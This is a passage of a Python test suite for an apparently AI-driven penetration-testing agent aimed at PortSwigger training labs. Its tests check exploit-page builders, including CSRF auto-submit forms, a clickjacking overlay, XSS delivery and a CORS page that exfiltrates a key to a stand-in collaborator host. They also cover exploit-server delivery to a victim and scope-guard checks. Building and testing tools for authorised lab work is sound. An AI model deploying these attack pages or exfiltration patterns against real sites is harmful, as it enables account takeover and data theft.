        reporter = object.__new__(ReporterAgent)
        path = reporter._save_report("test report")
        try:
            self.assertTrue(os.path.abspath(path).startswith(os.path.abspath(str(LOG_DIR))))
        finally:
            if os.path.exists(path):
                os.remove(path)


# =============================================================================
# WS2/WS5 finalization: category -> agenda seeding + offline integration drive
# =============================================================================

def _build_offline_orchestrator(target, objective="", lab_profile=None,
                                max_iterations=12):
    """Construct an Orchestrator fully offline (dummy key, no durable DB, no
    subagents, lexical RAG). Never makes a network call."""
    from hacking_agent.cli.orchestrator import Orchestrator

    env = {
        "DEEPSEEK_API_KEY": "test-key",
        "REYNARD_DURABLE_MEMORY": "0",
        "REYNARD_EMBEDDINGS": "lexical",
    }
    with patch.dict(os.environ, env, clear=False):
        return Orchestrator(
            target_url=target,
            objective=objective,
            lab_profile=lab_profile,
            subagents_enabled=False,
            max_iterations=max_iterations,
        )


class _FakeProvider:
    """Offline stand-in for an LLMProvider (pivot/self-critique role)."""

    def call_typed(self, system, user, schema, max_retries=0):
        return schema(diagnosis="surface exhausted", give_up=True)

    def call_text(self, system, user, max_retries=0):
        return ""


class _ScriptedCoordinator:
    """Always routes to exploitation so the specialist outcome script drives
    the agenda mechanics deterministically."""

    def decide(self, **kwargs):
        return CoordinatorDecision(
            done=False,
            next_agent="exploitation",
            task=AgentTask(task_description="pursue active hypothesis", context={}),
            reasoning="scripted route",
        )


class _ScriptedSpecialist:
    """Returns queued success/failure outcomes, then defaults to success."""

    def __init__(self, outcomes):
        self._outcomes = list(outcomes)
        self.calls = 0

    def execute(self, task):
        self.calls += 1
        ok = self._outcomes.pop(0) if self._outcomes else True
        return AgentResult(success=ok, summary="signal" if ok else "no signal")


class CategoryAgendaSeedingTests(unittest.TestCase):
    def test_category_playbooks_cover_non_web_categories(self):
        self.assertEqual(
            set(category_playbooks("network")), {"network_pentest", "metasploit"}
        )
        self.assertEqual(
            set(category_playbooks("binary")),
            {"binary_pwn", "reverse_engineering"},
        )
        self.assertEqual(category_playbooks("web"), ["essential_skills"])

    def test_network_ip_target_seeds_category_agenda(self):
        orch = _build_offline_orchestrator(
            "10.10.10.10", "Enumerate services on the authorized box."
        )
        try:
            self.assertEqual(orch.target_category, "network")
            orch._seed_hypotheses()
            agenda = orch.agenda.all()
            self.assertTrue(agenda, "non-web target produced an empty agenda")
            seeded = {h.vector for h in agenda
                      if h.notes == "seed:category_playbook"}
            self.assertTrue({"network_pentest", "metasploit"} <= seeded)
            for h in agenda:
                if h.notes == "seed:category_playbook":
                    self.assertEqual(h.vuln_type, "network")
        finally:
            orch.logger.close()

    def test_binary_bin_target_seeds_pwn_playbooks(self):
        self.assertEqual(detect_target_category("challenge.bin", "ELF pwn"), "binary")
        orch = _build_offline_orchestrator(
            "challenge.bin", "Reverse engineer this ELF binary and pop a shell."
        )
        try:
            self.assertEqual(orch.target_category, "binary")
            orch._seed_hypotheses()
            seeded = {h.vector for h in orch.agenda.all()
                      if h.notes == "seed:category_playbook"}
            self.assertTrue({"binary_pwn", "reverse_engineering"} <= seeded)
        finally:
            orch.logger.close()

    def test_web_target_seeding_stays_backward_compatible(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile)
        try:
            self.assertEqual(orch.target_category, "web")
            orch._seed_hypotheses()
            notes = {h.notes for h in orch.agenda.all()}
            self.assertNotIn("seed:category_playbook", notes)
            self.assertTrue(any(h.vuln_type == "xss" for h in orch.agenda.all()))
        finally:
            orch.logger.close()


class OrchestratorDryRunTests(unittest.TestCase):
    def test_offline_integration_drive(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile, max_iterations=12)
        try:
            with patch("hacking_agent.cli.orchestrator.load_methodology",
                       return_value=""), \
                    patch("hacking_agent.cli.orchestrator.console"):
                orch.sm.transition(Event.START, "test")
                orch._seed_hypotheses()

                # (1) hypotheses get seeded from the lab profile.
                self.assertTrue(orch.agenda.all())
                primary = next(h for h in orch.agenda.all()
                               if h.notes == "seed:lab_profile")
                self.assertEqual(primary.phase, "recon")

                # A cooler alternative so demotion can backtrack to it.
                alt = orch.agenda.add(
                    text="Alternative vector", vuln_type="sqli", vector="category",
                    phase="recon", heat=0.4, notes="test:alt",
                )

                orch.coordinator = _ScriptedCoordinator()
                spec = _ScriptedSpecialist([True, False, False, False])
                orch.specialists = {k: spec for k in orch.specialists}
                orch.registry.get = lambda role: _FakeProvider()

                # (2)+(3) coordinator step selects the hottest OPEN hypothesis
                # and a success advances its StrategyEngine phase.
                orch._step()
                self.assertIs(orch.active_hypothesis, primary)
                self.assertEqual(primary.phase, "injection")

                # (4) repeated failure demotes the vector and backtracks.
                for _ in range(3):
                    orch._step()
                self.assertEqual(primary.status, "demoted")
                self.assertIs(orch._select_active_hypothesis(), alt)

                # (5) report gating prevents premature done while alt untried.
                gated = orch._intercept_done(
                    CoordinatorDecision(done=True, reasoning="premature")
                )
                self.assertFalse(gated.done)
                self.assertIsNotNone(gated.next_agent)
        finally:
            orch.logger.close()


# =============================================================================
# imp-loop: StallDetector (no-progress / loop detection)
# =============================================================================

class StallDetectorTests(unittest.TestCase):
    def test_stall_fires_after_patience_no_progress_steps(self):
        from hacking_agent.core.strategy import StallDetector

        det = StallDetector(patience=3)
        # First observation never stalls (nothing to compare against).
        self.assertFalse(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=0, evidence_count=0,
        ))
        # Three consecutive no-progress steps -> stall on the third.
        self.assertFalse(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=0, evidence_count=0,
        ))
        self.assertFalse(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=0, evidence_count=0,
        ))
        self.assertTrue(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=0, evidence_count=0,
        ))

    def test_progress_resets_stall_counter(self):
        from hacking_agent.core.strategy import StallDetector

        det = StallDetector(patience=2)
        det.record(agent="recon", phase="recon", hypothesis_id="h1",
                   kg_count=0, evidence_count=0)
        det.record(agent="recon", phase="recon", hypothesis_id="h1",
                   kg_count=0, evidence_count=0)
        # New KG entity = progress, resets the counter.
        self.assertFalse(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=5, evidence_count=0,
        ))
        self.assertEqual(det.stall_count, 0)
        # A later phase also counts as progress.
        self.assertFalse(det.record(
            agent="exploitation", phase="injection", hypothesis_id="h1",
            kg_count=5, evidence_count=0,
        ))

    def test_orchestrator_stall_forces_backtrack_and_pivot(self):
        from hacking_agent.core.strategy import StallDetector

        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile)
        try:
            with patch("hacking_agent.cli.orchestrator.console"):
                orch._seed_hypotheses()
                h = orch._select_active_hypothesis()
                self.assertIsNotNone(h)
                orch.stall_detector = StallDetector(patience=1)
                # First step registers a baseline (no stall yet).
                orch._check_stall("recon")
                self.assertFalse(orch._needs_pivot)
                # Second step with no new KG/evidence/phase -> stall -> backtrack.
                orch._check_stall("recon")
                self.assertTrue(orch._needs_pivot)
                self.assertEqual(h.status, "demoted")
                self.assertGreaterEqual(orch._stall_forced_pivots, 1)
        finally:
            orch.logger.close()


# =============================================================================
# imp-loop: redundant-recon guard
# =============================================================================

class ReconGuardTests(unittest.TestCase):
    def test_redundant_recon_advances_phase_and_reroutes(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile)
        try:
            with patch("hacking_agent.cli.orchestrator.console"):
                orch._seed_hypotheses()
                h = orch._select_active_hypothesis()
                self.assertEqual(h.phase, "recon")
                # Materialize the recon surface for this vector.
                orch.memory.add_entity("Endpoint", {"url": target + "search"})
                orch._recon_materialized.add(orch._recon_signature(h))

                task = AgentTask(task_description="Re-run recon on target.",
                                 context={})
                self.assertTrue(orch._recon_is_redundant(task))
                routed, new_task = orch._advance_past_recon(task)
                self.assertNotEqual(routed, "recon")
                self.assertNotEqual(h.phase, "recon")
                self.assertIn("recon-guard", new_task.task_description)
        finally:
            orch.logger.close()

    def test_recon_not_redundant_without_materialized_surface(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile)
        try:
            with patch("hacking_agent.cli.orchestrator.console"):
                orch._seed_hypotheses()
                orch._select_active_hypothesis()
                task = AgentTask(task_description="Initial recon.", context={})
                self.assertFalse(orch._recon_is_redundant(task))
        finally:
            orch.logger.close()


# =============================================================================
# imp-schema: JSON pre-extraction + coercion + safe fallback
# =============================================================================

class JsonExtractionTests(unittest.TestCase):
    def test_extract_strips_json_fence(self):
        from hacking_agent.core.providers import _extract_json_object

        raw = "```json\n{\"a\": 1, \"b\": \"x\"}\n```"
        self.assertEqual(_extract_json_object(raw), '{"a": 1, "b": "x"}')

    def test_extract_drops_leading_and_trailing_prose(self):
        from hacking_agent.core.providers import _extract_json_object

        raw = 'Sure! Here is the JSON:\n{"k": "v"}\nHope that helps.'
        self.assertEqual(_extract_json_object(raw), '{"k": "v"}')

    def test_extract_is_brace_balanced_and_string_aware(self):
        from hacking_agent.core.providers import _extract_json_object

        raw = 'noise {"outer": {"inner": "}"}} trailing'
        extracted = _extract_json_object(raw)
        self.assertEqual(json.loads(extracted), {"outer": {"inner": "}"}})

    def test_extract_handles_think_block(self):
        from hacking_agent.core.providers import _extract_json_object

        raw = "<think>let me reason</think>\n{\"give_up\": false}"
        self.assertEqual(json.loads(_extract_json_object(raw)), {"give_up": False})

    def test_coerce_unwraps_single_item_list(self):
        from hacking_agent.core.providers import _coerce_to_schema

        data = _coerce_to_schema([{"diagnosis": "stuck"}], PivotDecision)
        self.assertIsInstance(data, dict)
        self.assertEqual(data["diagnosis"], "stuck")
        self.assertTrue(PivotDecision.model_validate(data))

    def test_fenced_prose_and_list_all_parse_into_pivot_decision(self):
        from hacking_agent.core.providers import (
            _coerce_to_schema, _extract_json_object,
        )

        cases = [
            '```json\n{"diagnosis":"a","give_up":true}\n```',
            'Here you go: {"diagnosis":"b","give_up":false} end',
            '[{"diagnosis":"c"}]',
        ]
        for raw in cases:
            with self.subTest(raw=raw):
                data = json.loads(_extract_json_object(raw))
                data = _coerce_to_schema(data, PivotDecision)
                self.assertTrue(PivotDecision.model_validate(data))

    def test_safe_fallback_only_for_all_optional_schema(self):
        from hacking_agent.core.providers import _safe_fallback
        from hacking_agent.core.schemas import AnalystOutput

        fallback = _safe_fallback(PivotDecision)
        self.assertIsInstance(fallback, PivotDecision)
        self.assertFalse(fallback.give_up)
        # A schema with security-relevant required fields must NOT fabricate one.
        self.assertIsNone(_safe_fallback(AnalystOutput))

    def test_repair_prompt_includes_error_and_example(self):
        from hacking_agent.core.providers import _repair_prompt

        try:
            PivotDecision.model_validate({"give_up": "not-a-bool"})
        except Exception as err:
            prompt = _repair_prompt(PivotDecision, err)
        self.assertIn("failed schema validation", prompt.lower())
        self.assertIn("give_up", prompt)


# =============================================================================
# imp-primitives: deterministic exploit-primitives builders
# =============================================================================

class ExploitPrimitivesTests(unittest.TestCase):
    def test_double_submit_sets_cookie_before_submit_via_onload(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.csrf_double_submit(
            "https://lab/my-account/change-email",
            email_field="email",
            csrf_field="csrf",
            token="FORGED",
            cookie_setter_url="https://lab/?search=inject",
            email_value="attacker@evil.net",
        )
        body = page.body
        # Cookie is planted by the img load, and submit fires from its onload.
        self.assertIn("onload=", body)
        self.assertNotIn("onerror", body)
        # Submit must happen exactly once, driven by the cookie-setter onload.
        self.assertEqual(body.count(".submit()"), 1)
        img_idx = body.index("<img")
        submit_idx = body.index(".submit()")
        self.assertLess(img_idx, submit_idx)
        # Both the form token and cookie-setter URL are present.
        self.assertIn("FORGED", body)
        self.assertIn("https://lab/?search=inject", body)
        self.assertEqual(page.head, p.DEFAULT_HTML_HEAD)

    def test_autosubmit_form_has_form_and_script_submit(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.csrf_autosubmit_form(
            "https://lab/email", {"email": "x@evil.net", "csrf": "T"},
        )
        self.assertIn(f'id="{p.FORM_ID}"', page.body)
        self.assertIn(".submit()", page.body)
        self.assertIn('name="email"', page.body)

    def test_clickjacking_frame_has_opacity_overlay_iframe(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.clickjacking_frame("https://lab/my-account", decoy_text="Win a prize")
        self.assertIn("opacity", page.body)
        self.assertIn("<iframe", page.body)
        self.assertIn("https://lab/my-account", page.body)
        self.assertIn("Win a prize", page.body)

    def test_cors_exfil_page_uses_credentialed_fetch_and_beacon(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.cors_exfil_page(
            "https://lab/api/key", "https://collab.oast/exfil",
        )
        self.assertIn("withCredentials = true", page.body)
        self.assertIn("https://lab/api/key", page.body)
        self.assertIn("https://collab.oast/exfil", page.body)

    def test_xss_dom_mode_uses_iframe(self):
        from hacking_agent.core import exploit_primitives as p

        reflected = p.xss_delivery_page("https://lab/?q=<script>", mode="reflected")
        self.assertIn("location", reflected.body)
        dom = p.xss_delivery_page("https://lab/#x", mode="dom")
        self.assertIn("<iframe", dom.body)


# =============================================================================
# imp-exploitsrv: exploit-server discovery + field parsing (mocked HTTP)
# =============================================================================

class ExploitServerTests(unittest.TestCase):
    def test_discovers_url_from_exploit_link(self):
        from hacking_agent.core.exploit_server import discover_exploit_server_url

        html = (
            '<a id="exploit-link" href="https://exploit-abc.exploit-server.net/">'
            "Go to exploit server</a>"
        )
        url = discover_exploit_server_url("https://lab", lab_html=html)
        self.assertEqual(url, "https://exploit-abc.exploit-server.net")

    def test_field_discovery_reads_custom_names_with_fallback(self):
        from hacking_agent.core.exploit_server import ExploitServer

        default_page = (
            '<form><input name="responseHead"><textarea name="responseBody">'
            '</textarea><input name="responseFile"><input name="urlIsHttps">'
            '<input name="formAction"></form>'
        )

        def http_get(url, follow_redirects=True):
            return default_page

        posts = []

        def http_post(url, data, headers=None):
            posts.append((url, data))
            return "HTTP/1.1 200 OK\n\nstored"

        server = ExploitServer("https://exploit-abc.exploit-server.net",
                               http_get=http_get, http_post=http_post)
        fields = server.form_fields()
        self.assertEqual(fields.head, "responseHead")
        self.assertEqual(fields.action, "formAction")

        self.assertTrue(server.store("HEAD", "BODY", path="/exploit", https=True))
        self.assertTrue(posts)
        _, data = posts[0]
        self.assertIn("formAction=STORE", data)
        self.assertIn("responseBody=BODY", data)
        self.assertIn("urlIsHttps=on", data)

    def test_deliver_reuses_last_store_fields(self):
        from hacking_agent.core.exploit_server import ExploitServer

        posts = []

        def http_get(url, follow_redirects=True):
            return None  # force fallback field names

        def http_post(url, data, headers=None):
            posts.append(data)
            return "HTTP/1.1 302 Found\n\n"

        server = ExploitServer("https://exploit-abc.exploit-server.net",
                               http_get=http_get, http_post=http_post)
        self.assertTrue(server.store("HEAD", "BODY"))
        self.assertTrue(server.deliver_to_victim())
        self.assertIn("formAction=STORE", posts[0])
        self.assertIn("formAction=DELIVER_TO_VICTIM", posts[1])

    def test_is_lab_solved_detects_banner(self):
        from hacking_agent.core.exploit_server import is_lab_solved

        self.assertTrue(is_lab_solved("<div class='is-solved'>"))
        self.assertTrue(is_lab_solved("Congratulations, you solved the lab"))
        self.assertFalse(is_lab_solved("not yet"))


# =============================================================================
# imp-loop: durable boost/demote folds into deterministic tool ranking
# =============================================================================

class ToolSelectorDurableTests(unittest.TestCase):
    def test_boost_and_demote_shift_tool_scores(self):
        from hacking_agent.core.tool_selector import rank_tools

        available = ["sqlmap", "nuclei_scan", "http_request"]
        base = {r["tool"]: r["score"]
                for r in rank_tools("sqli", "exploit", available_tools=available)}
        boosted = {r["tool"]: r["score"] for r in rank_tools(
            "sqli", "exploit", available_tools=available,
            boost_tools=["nuclei_scan"], demote_tools=["sqlmap"],
        )}
        if "nuclei_scan" in base and "nuclei_scan" in boosted:
            self.assertGreater(boosted["nuclei_scan"], base["nuclei_scan"])
        if "sqlmap" in base and "sqlmap" in boosted:
            self.assertLess(boosted["sqlmap"], base["sqlmap"])


# =============================================================================
# lab-corpus: PortSwigger corpus ingest + URL classification
# =============================================================================

class LabCorpusTests(unittest.TestCase):
    def test_classify_url_extracts_class_and_subvariant(self):
        from hacking_agent.core.lab_corpus import class_to_playbook, classify_url

        self.assertEqual(
            classify_url(
                "https://portswigger.net/web-security/sql-injection/"
                "union-attacks/lab-determine-number-of-columns"
            ),
            ("sql-injection", "union-attacks"),
        )
        # No sub-variant folder: the lab slug is the segment after the class.
        self.assertEqual(
            classify_url(
                "https://portswigger.net/web-security/web-cache-deception/"
                "lab-wcd-exploiting-origin-server-normalization"
            ),
            ("web-cache-deception", ""),
        )
        self.assertEqual(classify_url(""), ("", ""))
        self.assertEqual(class_to_playbook("sql-injection"), "sqli")
        self.assertEqual(class_to_playbook("logic-flaws"), "business_logic")
        self.assertEqual(class_to_playbook("llm-attacks"), "web_llm_attacks")
        self.assertEqual(class_to_playbook("unknown-class"), "")

    def test_load_corpus_parses_entries_credentials_and_stats(self):
        import tempfile
        from hacking_agent.core.lab_corpus import load_corpus, stats

        data = [
            {
                "level": "PRACTITIONER",
                "title": "UNION attack",
                "url": "https://portswigger.net/web-security/sql-injection/"
                       "union-attacks/lab-a",
                "description": "desc",
                "credentials": None,
            },
            {
                "level": "EXPERT",
                "title": "JWT confusion",
                "url": "https://portswigger.net/web-security/jwt/lab-b",
                "description": "desc2",
                "credentials": "administrator:admin, wiener:peter",
            },
        ]
        with tempfile.NamedTemporaryFile(
            "w", suffix=".json", delete=False, encoding="utf-8"
        ) as fh:
            json.dump(data, fh)
            path = fh.name
        try:
            entries = load_corpus(path)
            self.assertEqual(len(entries), 2)
            self.assertEqual(entries[0].vuln_class, "sql-injection")
            self.assertEqual(entries[0].subvariant, "union-attacks")
            self.assertEqual(entries[0].playbook_id, "sqli")
            self.assertEqual(entries[0].credentials, [])
            self.assertEqual(entries[1].level, "EXPERT")
            self.assertEqual(entries[1].playbook_id, "jwt")
            self.assertEqual(
                entries[1].credentials[0],
                {"username": "administrator", "password": "admin"},
            )
            summary = stats(entries)
            self.assertEqual(summary["total"], 2)
            self.assertEqual(summary["levels"]["EXPERT"], 1)
            self.assertEqual(summary["classes"]["sql-injection"]["playbook_id"], "sqli")
        finally:
            os.remove(path)

    def test_placeholder_target_detection(self):
        from hacking_agent.core.lab_corpus import (
            TARGET_PLACEHOLDER,
            is_placeholder_target,
        )

        self.assertTrue(is_placeholder_target(TARGET_PLACEHOLDER))
        self.assertTrue(is_placeholder_target(""))
        self.assertTrue(
            is_placeholder_target("https://0aXXXX.web-security-academy.net/")
        )
        self.assertFalse(
            is_placeholder_target("https://0a12.web-security-academy.net/")
        )

    def test_authoritative_corpus_present_and_fully_mapped(self):
        from hacking_agent.core.lab_corpus import DEFAULT_CORPUS_PATH, load_corpus

        if not DEFAULT_CORPUS_PATH.exists():
            self.skipTest("authoritative corpus dataset not present")
        entries = load_corpus()
        self.assertGreaterEqual(len(entries), 213)
        unmapped = [e.url for e in entries if not e.playbook_id]
        self.assertEqual(unmapped, [])


class StrongTierRoutingTests(unittest.TestCase):
    def test_strong_tier_falls_back_to_pivot_then_default(self):
        with patch.dict(os.environ, {
            "LLM_DEFAULT_PROVIDER": "deepseek",
            "DEEPSEEK_API_KEY": "test",
            "LLM_PIVOT_MODEL": "pivot-model",
            "LLM_PIVOT_REASONING_EFFORT": "high",
        }, clear=True):
            registry = ProviderRegistry.from_env()
        strong = registry.config("strong")
        self.assertEqual(strong.model, "pivot-model")
        self.assertEqual(strong.reasoning_effort, "high")
        self.assertIn("strong", registry.describe())

    def test_strong_tier_prefers_explicit_strong_env(self):
        with patch.dict(os.environ, {
            "LLM_DEFAULT_PROVIDER": "deepseek",
            "DEEPSEEK_API_KEY": "test",
            "LLM_STRONG_MODEL": "strong-model",
            "LLM_PIVOT_MODEL": "pivot-model",
        }, clear=True):
            registry = ProviderRegistry.from_env()
        self.assertEqual(registry.config("strong").model, "strong-model")


class TrainingScorecardTests(unittest.TestCase):
    def test_aggregate_and_not_run_row_classification(self):
        from hacking_agent.cli.lab_eval import _aggregate, _not_run_row

        not_run = _not_run_row({
            "name": "c",
            "target": "TODO_LIVE_INSTANCE_URL",
            "expected_vuln": "xss",
            "lab_url": "https://portswigger.net/web-security/"
                       "cross-site-scripting/lab-c",
            "level": "EXPERT",
        }, "not-run: placeholder")
        self.assertTrue(not_run["not_run"])
        self.assertEqual(not_run["class"], "xss")

        rows = [
            {"class": "sqli", "level": "PRACTITIONER", "solved": True, "not_run": False},
            {"class": "sqli", "level": "PRACTITIONER", "solved": False, "not_run": False},
            not_run,
        ]
        by_class = _aggregate(rows, "class")
        self.assertEqual(by_class["sqli"]["run"], 2)
        self.assertEqual(by_class["sqli"]["solved"], 1)
        self.assertEqual(by_class["sqli"]["solve_rate"], 0.5)
        self.assertEqual(by_class["xss"]["labs"], 1)
        self.assertEqual(by_class["xss"]["run"], 0)


class CoverageMatrixTests(unittest.TestCase):
    def test_generate_coverage_matrix_renders_class_rows_and_solve_rate(self):
        import tempfile

        from hacking_agent.core.coverage import generate_coverage_matrix
        from hacking_agent.core.lab_corpus import DEFAULT_CORPUS_PATH

        if not DEFAULT_CORPUS_PATH.exists():
            self.skipTest("authoritative corpus dataset not present")
        scorecard = {
            "generated_at": "t",
            "summary": {"run": 2, "solved": 1, "solve_rate": 0.5, "skipped": 0},
            "by_class": {"sqli": {"labs": 16, "run": 2, "solved": 1, "solve_rate": 0.5}},
        }
        with tempfile.TemporaryDirectory() as tmp:
            out = os.path.join(tmp, "matrix.md")
            path = generate_coverage_matrix(out_path=out, scorecard=scorecard)
            text = open(path, encoding="utf-8").read()
        self.assertIn("Coverage Matrix", text)
        self.assertIn("sql-injection", text)
        self.assertIn("`sqli`", text)
        self.assertIn("1/2 (50%)", text)


# =============================================================================
# Phase 2 — connections + tooling layer (burp racing / OSINT / class tools)
# =============================================================================

class Phase2ToolRegistrationTests(unittest.TestCase):
    def test_new_phase2_tools_registered_and_in_sync(self):
        self.assertEqual(len(TOOL_FUNCTIONS), len(TOOL_SCHEMAS))
        schema_names = {t["function"]["name"] for t in TOOL_SCHEMAS}
        self.assertEqual(schema_names, set(TOOL_FUNCTIONS))
        for name in (
            "race_send",
            "shodan_host_lookup", "shodan_search", "censys_host",
            "dns_recon", "tls_info",
            "jwt_tool", "ysoserial_gen", "phpggc_gen", "ssti_probe",
        ):
            self.assertIn(name, TOOL_FUNCTIONS)
            self.assertIn(name, schema_names)

    def test_new_network_tools_are_scope_checked(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        in_scope = [
            ("race_send", {"url": "https://lab.example.com/login"}),
            ("ssti_probe", {"url": "https://lab.example.com/?name=x"}),
            ("dns_recon", {"domain": "lab.example.com"}),
            ("tls_info", {"target": "lab.example.com:443"}),
            ("jwt_tool", {"token": "a.b.c", "target_url": "https://lab.example.com/"}),
        ]
        for tool, args in in_scope:
            with self.subTest(tool=tool):
                guard.validate(tool, args)  # should not raise
        out_scope = [
            ("race_send", {"url": "https://evil.example.net/login"}),
            ("ssti_probe", {"url": "https://evil.example.net/?name=x"}),
            ("dns_recon", {"domain": "evil.example.net"}),
            ("tls_info", {"target": "evil.example.net"}),
        ]
        for tool, args in out_scope:
            with self.subTest(tool=tool):
                with self.assertRaises(ScopeViolation):
                    guard.validate(tool, args)

    def test_token_only_tools_pass_scope_without_network_target(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        # No target_url -> jwt_tool is token-only and must not be blocked.
        guard.validate("jwt_tool", {"token": "a.b.c"})
        guard.validate("ysoserial_gen", {"gadget": "URLDNS", "command": "x"})
        guard.validate("phpggc_gen", {"chain": "Monolog/RCE1", "command": "id"})


class ShodanGracefulTests(unittest.TestCase):
    def test_shodan_host_lookup_without_key_degrades(self):
        from hacking_agent.integrations import shodan as shodan_mod

        with patch.dict(os.environ, {}, clear=True):
            client = shodan_mod.ShodanClient()
            self.assertFalse(client.is_configured())
            result = client.host_lookup("1.2.3.4")
        self.assertFalse(result["configured"])
        self.assertIn("SHODAN_API_KEY", result["error"])
        self.assertEqual(result["ip"], "1.2.3.4")

    def test_shodan_search_without_key_degrades(self):
        from hacking_agent.integrations import shodan as shodan_mod

        with patch.dict(os.environ, {}, clear=True):
            result = shodan_mod.ShodanClient().search("apache")
        self.assertFalse(result["configured"])
        self.assertEqual(result["query"], "apache")

    def test_censys_without_creds_degrades(self):
        from hacking_agent.integrations import shodan as shodan_mod

        with patch.dict(os.environ, {}, clear=True):
            client = shodan_mod.CensysClient()
            self.assertFalse(client.is_configured())
            result = client.host_lookup("1.2.3.4")
        self.assertFalse(result["configured"])
        self.assertIn("CENSYS_API_ID", result["error"])

    def test_shodan_tool_execution_is_stable_json_without_key(self):
        with patch.dict(os.environ, {}, clear=True):
            from hacking_agent.integrations import shodan as shodan_mod
            shodan_mod._shodan_client = None  # reset singleton under cleared env
            raw = execute_tool("shodan_host_lookup", {"ip": "8.8.8.8"})
            shodan_mod._shodan_client = None
        payload = json.loads(raw)
        self.assertFalse(payload["configured"])

    def test_status_reports_configuration_without_network(self):
        from hacking_agent.integrations import shodan as shodan_mod

        with patch.dict(os.environ, {"SHODAN_API_KEY": "k"}, clear=True):
            shodan_mod._shodan_client = None
            shodan_mod._censys_client = None
            status = shodan_mod.status()
            shodan_mod._shodan_client = None
            shodan_mod._censys_client = None
        self.assertTrue(status["shodan_configured"])
        self.assertFalse(status["censys_configured"])


class RaceSenderTests(unittest.TestCase):
    def test_build_request_sets_method_host_and_content_length(self):
        from hacking_agent.integrations import race as race_mod

        raw = race_mod._build_request(
            "lab.example.com", "/login", "POST",
            {"Content-Type": "application/x-www-form-urlencoded"},
            "user=admin",
        ).decode("utf-8")
        self.assertTrue(raw.startswith("POST /login HTTP/1.1\r\n"))
        self.assertIn("Host: lab.example.com", raw)
        self.assertIn("Content-Length: 10", raw)
        self.assertTrue(raw.endswith("\r\n\r\nuser=admin"))

    def test_status_and_summary_helpers(self):
        from hacking_agent.integrations import race as race_mod

        self.assertEqual(
            race_mod._status_of(b"HTTP/1.1 302 Found\r\nX: y\r\n\r\n"), 302
        )
        self.assertIsNone(race_mod._status_of(b"garbage"))
        report = race_mod._summarize([
            {"status": 200, "elapsed_ms": 10.0},
            {"status": 302, "elapsed_ms": 12.0},
            {"error": "boom"},
        ], "parallel")
        self.assertEqual(report["sent"], 3)
        self.assertEqual(report["responded"], 2)
        self.assertEqual(sorted(report["distinct_statuses"]), ["200", "302"])

    def test_race_send_rejects_unparsable_url(self):
        from hacking_agent.integrations import race as race_mod

        self.assertIn("error", race_mod.race_send(""))


# =============================================================================
# Phase 3 — profiler routing (lab_intel.route_lab) for every corpus class
# =============================================================================

class ProfilerRoutingTests(unittest.TestCase):
    def test_every_corpus_lab_routes_to_a_real_playbook(self):
        from hacking_agent.core.lab_corpus import DEFAULT_CORPUS_PATH, load_corpus
        from hacking_agent.core.lab_intel import route_lab

        if not DEFAULT_CORPUS_PATH.exists():
            self.skipTest("authoritative corpus dataset not present")
        entries = load_corpus()
        self.assertGreaterEqual(len(entries), 213)
        unresolved = []
        for entry in entries:
            routed = route_lab(url=entry.url, title=entry.title, level=entry.level)
            if not routed["playbook_id"] or routed["expert_playbook"] is None:
                unresolved.append(entry.url)
            else:
                self.assertEqual(routed["playbook_id"], entry.playbook_id)
                self.assertIn(routed["lab_level"], ("APPRENTICE", "PRACTITIONER", "EXPERT"))
                self.assertTrue(routed["entry_phase"])
                self.assertTrue(routed["primary_tools"])
        self.assertEqual(unresolved, [])

    def test_route_lab_from_canonical_url_slug(self):
        from hacking_agent.core.lab_intel import route_lab

        routed = route_lab(
            url="https://portswigger.net/web-security/jwt/"
                "lab-jwt-authentication-bypass-via-unverified-signature"
        )
        self.assertEqual(routed["playbook_id"], "jwt")
        self.assertEqual(routed["vuln_class"], "jwt")
        self.assertIn("jwt_tool", routed["primary_tools"])
        self.assertEqual(routed["entry_phase"], "exploitation")

    def test_route_lab_matches_corpus_title(self):
        from hacking_agent.core.lab_corpus import DEFAULT_CORPUS_PATH, load_corpus
        from hacking_agent.core.lab_intel import route_lab

        if not DEFAULT_CORPUS_PATH.exists():
            self.skipTest("authoritative corpus dataset not present")
        sample = load_corpus()[0]
        routed = route_lab(title=sample.title)
        self.assertEqual(routed["routing_source"], "corpus")
        self.assertEqual(routed["playbook_id"], sample.playbook_id)

    def test_route_lab_text_fallback_without_url(self):
        from hacking_agent.core.lab_intel import route_lab

        routed = route_lab(
            title="Lab", objective="HTTP request smuggling, confirming a CL.TE vulnerability",
        )
        self.assertEqual(routed["playbook_id"], "request_smuggling")
        self.assertIn("request_smuggling_probe", routed["recommended_tools"])

    def test_subvariant_layers_extra_tools(self):
        from hacking_agent.core.lab_intel import route_lab

        routed = route_lab(
            url="https://portswigger.net/web-security/sql-injection/blind/lab-x"
        )
        self.assertEqual(routed["playbook_id"], "sqli")
        self.assertEqual(routed["subvariant"], "blind")
        self.assertIn("oob_get_domain", routed["recommended_tools"])

    def test_client_side_flag_and_corpus_lookup(self):
        from hacking_agent.core.lab_intel import corpus_lookup, route_lab
        from hacking_agent.core.lab_corpus import DEFAULT_CORPUS_PATH

        routed = route_lab(
